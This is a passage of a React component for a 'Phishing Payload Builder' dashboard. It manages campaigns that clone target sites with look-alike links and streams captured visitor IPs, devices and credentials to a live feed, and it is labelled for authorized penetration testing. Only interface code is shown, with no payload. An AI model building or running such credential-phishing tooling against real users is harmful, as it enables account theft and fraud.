    setCampaigns(prev => [campaign, ...prev])
    setSelectedCampaign(campaign.id)
    setFilterCampaign(campaign.id)
  }

  async function handleDeleteCampaign(id: string) {
    await fetch(`${API}/api/phishing/campaigns/${id}`, { method: 'DELETE' })
    setCampaigns(prev => prev.filter(c => c.id !== id))
    setCaptures(prev => prev.filter(c => c.campaignId !== id))
    if (selectedCampaign === id) { setSelectedCampaign(null); setFilterCampaign('all') }
  }

  const visibleCaptures = filterCampaign === 'all'
    ? captures
    : captures.filter(c => c.campaignId === filterCampaign)

  const credCount = visibleCaptures.filter(c => c.type === 'credentials').length

  return (
    <div className="flex flex-col h-full bg-surface-0">

      {/* Header */}
      <div className="flex-shrink-0 border-b border-wire-2 px-6 py-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-rose-500/10 border border-rose-500/20">
              <Fish size={18} className="text-rose-400" />
            </div>
            <div>
              <h1 className="text-lg font-semibold text-slate-100">Phishing Payload Builder</h1>
              <p className="text-[12px] text-slate-500 mt-0.5">Clone, beacon-inject, capture — links mimic the target site's URL structure</p>
            </div>
          </div>

          <div className="flex items-center gap-4">
            {[
              { label: 'Campaigns', value: campaigns.length,  color: 'text-slate-200' },
              { label: 'Captures',  value: captures.length,   color: 'text-blue-400' },
              { label: 'Creds',     value: credCount,          color: 'text-rose-400' },
            ].map(({ label, value, color }, i) => (
              <div key={label} className="flex items-center gap-4">
                {i > 0 && <div className="w-px h-8 bg-wire-2" />}
                <div className="text-right">
                  <p className="text-[10px] text-slate-600 uppercase tracking-wider">{label}</p>
                  <p className={clsx('text-lg font-bold', color)}>{value}</p>
                </div>
              </div>
            ))}
            <div className="w-px h-8 bg-wire-2" />
            <div className="flex items-center gap-1.5">
              <span className={clsx('w-1.5 h-1.5 rounded-full', sseConnected ? 'bg-emerald-400 animate-pulse' : 'bg-slate-600')} />
              <span className="text-[11px] text-slate-500">{sseConnected ? 'Live' : 'Offline'}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Tunnel URL banner */}
      <TunnelBanner manualUrl={publicBaseUrl} autoUrl={autoUrl} autoStatus={autoStatus} onManualChange={setPublicBaseUrl} />

      {/* Body */}
      <div className="flex flex-1 overflow-hidden">

        {/* Left panel */}
        <div className="w-80 flex-shrink-0 border-r border-wire-2 flex flex-col overflow-hidden">
          <div className="flex-shrink-0 border-b border-wire-2 p-4">
            <div className="flex items-center gap-2 mb-3">
              <Plus size={12} className="text-slate-500" />
              <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">New Campaign</span>
            </div>
            <NewCampaignForm onCreated={handleCampaignCreated} />
          </div>

          <div className="flex-1 overflow-y-auto">
            <div className="p-3 space-y-2">
              <div className="flex items-center gap-2 mb-1 px-1">
                <Layers size={11} className="text-slate-600" />
                <span className="text-[11px] font-semibold text-slate-500 uppercase tracking-wider">Active Campaigns</span>
                {campaigns.length > 0 && <span className="ml-auto text-[10px] text-slate-600">{campaigns.length}</span>}
              </div>
              <AnimatePresence mode="popLayout">
                {campaigns.length === 0 ? (
                  <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-8 space-y-2">
                    <Globe size={24} className="text-slate-700 mx-auto" />
                    <p className="text-[12px] text-slate-600">No campaigns yet</p>
                    <p className="text-[11px] text-slate-700">Use a preset or enter a URL above</p>
                  </motion.div>
                ) : campaigns.map(c => (
                  <CampaignCard key={c.id} campaign={c} selected={selectedCampaign === c.id}
                    baseUrl={publicBaseUrl || autoUrl}
                    onSelect={() => handleSelectCampaign(c.id)}
                    onDelete={() => handleDeleteCampaign(c.id)} />
                ))}
              </AnimatePresence>
            </div>
          </div>
        </div>

        {/* Right panel — live feed */}
        <div className="flex-1 flex flex-col overflow-hidden">
          <div className="flex-shrink-0 border-b border-wire-2 px-5 py-3 flex items-center gap-3">
            <Radio size={13} className={sseConnected ? 'text-emerald-400 animate-pulse' : 'text-slate-600'} />
            <span className="text-[12px] font-semibold text-slate-300">Live Capture Feed</span>

            {/* Campaign filter */}
            <div className="flex items-center gap-1.5 ml-4">
              <button onClick={() => setFilterCampaign('all')}
                className={clsx('px-2.5 py-1 rounded text-[11px] font-medium transition-colors',
                  filterCampaign === 'all' ? 'bg-slate-700 text-slate-200' : 'text-slate-500 hover:text-slate-300')}>
                All
              </button>
              {campaigns.map(c => (
                <button key={c.id} onClick={() => { setFilterCampaign(c.id); loadCaptures(c.id) }}
                  className={clsx('px-2.5 py-1 rounded text-[11px] font-medium transition-colors max-w-[100px] truncate',
                    filterCampaign === c.id ? 'bg-blue-500/20 text-blue-300' : 'text-slate-500 hover:text-slate-300')}>
                  {c.name}
                </button>
              ))}
            </div>

            <div className="ml-auto flex items-center gap-3">
              {visibleCaptures.length > 0 && <span className="text-[11px] text-slate-500">{visibleCaptures.length} capture{visibleCaptures.length !== 1 ? 's' : ''}</span>}
              {credCount > 0 && <span className="flex items-center gap-1 text-[11px] text-rose-400"><KeyRound size={10} />{credCount} cred{credCount !== 1 ? 's' : ''}</span>}
            </div>
          </div>

          <div className="flex-1 overflow-y-auto p-4">
            {visibleCaptures.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full text-center space-y-4 pb-16">
                <div className="p-6 rounded-full bg-surface-1 border border-wire-2">
                  <Radio size={32} className="text-slate-700" />
                </div>
                <div className="space-y-1">
                  <p className="text-slate-400 font-medium">Waiting for captures</p>
                  <p className="text-[12px] text-slate-600 max-w-xs">
                    {campaigns.length === 0
                      ? 'Build a campaign — the generated link mimics the target site\'s URL. Share it to capture visitor data in real-time.'
                      : 'Share the campaign link. When a target visits it, their IP, device, and credentials stream here live.'}
                  </p>
                </div>
                {campaigns.length > 0 && (
                  <div className="flex items-center gap-2 px-3 py-2 rounded-md bg-surface-1 border border-wire-2">
                    <Shield size={12} className="text-slate-600" />
                    <span className="text-[11px] text-slate-600">Authorized penetration testing only</span>
                  </div>
                )}
              </div>
            ) : (
              <div className="space-y-2 max-w-3xl">
                <AnimatePresence mode="popLayout" initial={false}>
                  {visibleCaptures.map(c => (
                    <CaptureCard key={c.id} capture={c} highlight={newCaptures.has(c.id)} />
                  ))}
                </AnimatePresence>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
